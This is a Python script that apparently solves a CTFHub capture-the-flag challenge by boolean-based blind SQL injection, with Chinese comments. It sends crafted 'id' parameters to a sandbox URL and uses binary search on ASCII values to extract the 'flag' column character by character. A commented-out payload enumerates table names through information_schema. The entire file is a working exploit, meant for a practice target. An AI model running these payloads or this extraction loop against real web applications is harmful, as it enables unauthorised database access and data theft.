import requests

# https://blog.csdn.net/cxiaodi/article/details/124673403?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-124673403-blog-123314094.pc_relevant_aa2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-124673403-blog-123314094.pc_relevant_aa2&utm_relevant_index=4

url = "http://challenge-826aac15b62cce49.sandbox.ctfhub.com:10800/"

flag = ""
for i in range(1, 50):  # 遍历的字符总数
    left = 32  # 常用字符的ascii码范围
    right = 128
    # 布尔注入只能查看sql语句的true false,利用2分法，对比ascii码爆破每个字符
    while left < right:
        mid = (left + right) // 2
        # payload = f"?id=1+and+ascii(substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())%2C{i}%2C1))>{mid}" #从information_schema便利表名
        # ascii返回左边第一个字符的ascii, substr函数用于截取对应字段指定长度
        payload = f"?id=1+and+ascii(substr((select+group_concat(flag)+from+flag)%2C{i}%2C1))>{mid}"  # flag列的字段
        urls = url + payload
        res = requests.get(urls)
        # print(mid)
        # print(res.text)
        if 'query_success' in res.text:
            left = mid + 1
        else:
            right = mid
    if left != 32:
        flag += chr(left)
    else:
        break
    print(flag)
